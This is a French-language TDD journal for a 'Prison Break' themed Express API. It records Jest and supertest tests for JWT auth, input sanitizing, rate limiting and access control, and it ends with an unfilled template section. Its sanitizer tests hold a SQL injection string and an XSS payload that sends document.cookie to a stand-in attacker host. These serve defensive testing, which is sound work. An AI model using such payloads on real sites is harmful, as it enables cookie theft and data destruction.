---
stability: intemporel
---

# TDD JOURNAL : PRISON BREAK API
Temps de lecture ~6 min

Ce journal trace l'ordre réel dans lequel les tests ont été écrits. Le cahier des charges impose : sécurité d'abord, puis les routes métier. Une API non sécurisée n'est pas une API.

---

## ÉTAPE 1 : `evasionService.js` : JWT sign et verify

Avant de toucher Express, le service d'auth est testé isolément.

```js
test('sign() génère un token avec les claims corrects', () => {
 const token = authService.sign({ id: 'scofield', role: 'inmate' });
 const decoded = jwt.decode(token);
 expect(decoded.id).toBe('scofield');
 expect(decoded.role).toBe('inmate');
 expect(decoded.exp).toBeDefined();
});

test('verify() lève une AuthError sur token expiré', () => {
 const expiredToken = jwt.sign({ id: 'x' }, SECRET, { expiresIn: '-1s' });
 expect(() => authService.verify(expiredToken)).toThrow(AuthError);
});
```

Le deuxième test a forcé de définir `AuthError` avant `authService`. Bonne dépendance dans le bon sens.

---

## ÉTAPE 2 : `sanitizer.js` : T-Bag essaie d'injecter

Le sanitizer est testé séparément, sans serveur.

```js
test('bloque une injection SQL basique', () => {
 const malInput = "scofield'; DROP TABLE prisonniers; --";
 expect(() => sanitizer.validateCode(malInput)).toThrow(ValidationError);
});

test('bloque un payload XSS dans un champ texte', () => {
 const xss = '<script>fetch("http://tbag.evil/", {method:"POST", body: document.cookie})</script>';
 expect(() => sanitizer.validateText(xss)).toThrow(ValidationError);
});

test('laisse passer un code prisonnier valide', () => {
 expect(() => sanitizer.validateCode('scofield-83712')).not.toThrow();
});
```

Premier implémentation : trop permissive, le test XSS passait avec des guillemets encodés. Fix : validation par allowlist (format exact autorisé) au lieu de blocklist (patterns interdits).

---

## ÉTAPE 3 : `rateLimiter.js` : bloquer T-Bag avant qu'il brute-force

```js
test('bloque après 5 tentatives depuis la même IP', () => {
 const ip = '192.168.1.100';
 for (let i = 0; i < 5; i++) {
  rateLimiter.record(ip);
 }
 expect(rateLimiter.isBlocked(ip)).toBe(true);
});

test('reset automatique après 15 minutes', () => {
 jest.useFakeTimers();
 const ip = '10.0.0.1';
 for (let i = 0; i < 5; i++) rateLimiter.record(ip);

 jest.advanceTimersByTime(16 * 60 * 1000);
 expect(rateLimiter.isBlocked(ip)).toBe(false);
 jest.useRealTimers();
});
```

`jest.useFakeTimers()` ici est obligatoire : sans ça, le test devrait attendre 15 minutes réelles.

---

## ÉTAPE 4 : Routes auth avec supertest

```js
test('POST /evasion/badge retourne un JWT valide avec les bons credentials', async () => {
 const res = await request(app)
  .post('/evasion/badge')
  .send({ code: 'scofield-83712', pin: 'S0a0r0i3' });

 expect(res.status).toBe(200);
 expect(res.body.token).toBeDefined();
});

test('POST /evasion/badge retourne 401 avec des credentials incorrects', async () => {
 const res = await request(app)
  .post('/evasion/badge')
  .send({ code: 'tbag', pin: 'mauvais' });

 expect(res.status).toBe(401);
 expect(res.body.error).toBe('InvalidCredentialsError');
 expect(res.body.stack).toBeUndefined(); // pas de stack trace leakée
});
```

Le deuxième test a attrapé une première version du handler qui retournait `err.message` et `err.stack` directement. Fix : `errorHandler.js` filtre ce qui sort vers le client.

---

## ÉTAPE 5 : Routes protégées et contrôle d'accès

```js
test('GET /plan/phase/2 retourne 401 sans token', async () => {
 const res = await request(app).get('/plan/phase/2');
 expect(res.status).toBe(401);
});

test('GET /plan/phase/2 retourne 403 si role inmate mais phase admin-only', async () => {
 const token = authService.sign({ id: 'tbag', role: 'inmate' });
 const res = await request(app)
  .get('/plan/phase/0')  // phase de contrôle, admin seulement
  .set('Authorization', `Bearer ${token}`);

 expect(res.status).toBe(403);
});
```

---

## RÉCAPITULATIF DE L'ORDRE RÉEL

```
1. AuthError + NotFoundError (erreurs custom d'abord)
2. evasionService.js (JWT sign/verify sans Express)
3. sanitizer.js (isolation totale)
4. rateLimiter.js (avec jest fake timers)
5. Routes auth (supertest)
6. Routes prisonniers (CRUD)
7. Routes plan (accès restreint par phase)
8. security.test.js (tests de pénétration sur les attaques connues)
```

Total : 63 tests à la fin, répartis sur 4 fichiers de test.

## Ce qui aurait été impossible à tester si j'avais gardé la version précédente

Section obligatoire (chantier v14 #15.5). À remplir avec au moins un exemple
concret par refactoring notable du projet :

- Version pré-refacto : ...
- Ce qui bloquait : ...
- Refacto appliqué : ...
- Test devenu possible : ...
